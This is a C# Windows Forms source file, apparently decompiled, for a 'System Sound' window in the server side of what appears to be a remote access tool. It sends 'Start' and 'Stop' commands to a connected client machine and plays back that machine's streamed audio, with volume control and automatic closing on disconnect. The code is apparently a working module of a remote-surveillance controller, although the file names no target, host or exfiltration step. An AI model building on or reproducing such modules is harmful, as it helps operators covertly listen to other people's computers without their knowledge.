using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using NAudio.Wave;
using NAudio.Wave.SampleProviders;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormSystemSound : FormMaterial
{
	public WaveOut waveOut;

	public BufferedWaveProvider bufferedWaveProvider;

	public VolumeSampleProvider volumeSampleProvider;

	public Clients client;

	public Clients parrent;

	private IContainer components;

	public MaterialSwitch materialSwitch1;

	public Timer timer1;

	public MaterialSlider materialSlider1;

	public FormSystemSound()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormSystemSound_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		try
		{
			MaterialSlider slider = materialSlider1;
			PropertyInfo valueProperty = slider.GetType().GetProperty("Value");
			PropertyInfo minProperty = slider.GetType().GetProperty("RangeMin");
			PropertyInfo maxProperty = slider.GetType().GetProperty("RangeMax");
			if (minProperty != null)
			{
				minProperty.SetValue(slider, 0);
			}
			if (maxProperty != null)
			{
				maxProperty.SetValue(slider, 100);
			}
			if (valueProperty != null)
			{
				valueProperty.SetValue(slider, 50);
			}
		}
		catch
		{
		}
		timer1.Start();
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (waveOut != null)
		{
			waveOut.Stop();
			waveOut.Dispose();
		}
		if (bufferedWaveProvider != null)
		{
			bufferedWaveProvider = null;
		}
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(48000, 16, 2));
			bufferedWaveProvider.DiscardOnBufferOverflow = true;
			client.Send(LEB128.Write(new object[1] { "Start" }));
			volumeSampleProvider = new VolumeSampleProvider(bufferedWaveProvider.ToSampleProvider());
			try
			{
				PropertyInfo valueProperty = materialSlider1.GetType().GetProperty("Value");
				if (valueProperty != null)
				{
					int value = (int)valueProperty.GetValue(materialSlider1);
					volumeSampleProvider.Volume = (float)value / 100f;
				}
				else
				{
					volumeSampleProvider.Volume = 0.5f;
				}
			}
			catch
			{
				volumeSampleProvider.Volume = 0.5f;
			}
			waveOut = new WaveOut();
			waveOut.Volume = 1f;
			waveOut.Init(volumeSampleProvider);
			waveOut.Play();
		}
		else
		{
			if (waveOut != null)
			{
				waveOut.Stop();
				waveOut.Dispose();
			}
			if (bufferedWaveProvider != null)
			{
				bufferedWaveProvider = null;
			}
			client.Send(LEB128.Write(new object[1] { "Stop" }));
		}
	}

	private void materialSlider1_onValueChanged(object sender)
	{
		if (!materialSwitch1.Checked || volumeSampleProvider == null)
		{
			return;
		}
		try
		{
			MaterialSlider slider = materialSlider1;
			PropertyInfo valueProperty = slider.GetType().GetProperty("Value");
			if (valueProperty != null)
			{
				int value = (int)valueProperty.GetValue(slider);
				volumeSampleProvider.Volume = (float)value / 100f;
			}
		}
		catch
		{
			volumeSampleProvider.Volume = 0.5f;
		}
	}

	public void Buffer(byte[] e)
	{
		if (waveOut != null)
		{
			bufferedWaveProvider.AddSamples(e, 0, e.Count());
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void ChangeScheme(object sender)
	{
		Color back = (BackColor = ((MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK) ? Color.FromArgb(40, 40, 40) : Color.White));
		if (materialSlider1 != null)
		{
			materialSlider1.BackColor = back;
			materialSlider1.Invalidate();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.materialSlider1 = new MaterialSkin.Controls.MaterialSlider();
		base.SuspendLayout();
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(24, 110);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 29;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.materialSlider1.Depth = 0;
		this.materialSlider1.ForeColor = System.Drawing.Color.FromArgb(222, 0, 0, 0);
		this.materialSlider1.Location = new System.Drawing.Point(6, 67);
		this.materialSlider1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSlider1.Name = "materialSlider1";
		this.materialSlider1.Size = new System.Drawing.Size(323, 40);
		this.materialSlider1.TabIndex = 30;
		this.materialSlider1.Text = "";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(335, 159);
		base.Controls.Add(this.materialSlider1);
		base.Controls.Add(this.materialSwitch1);
		base.Name = "FormSystemSound";
		this.Text = "System Sound";
		base.Load += new System.EventHandler(FormSystemSound_Load);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
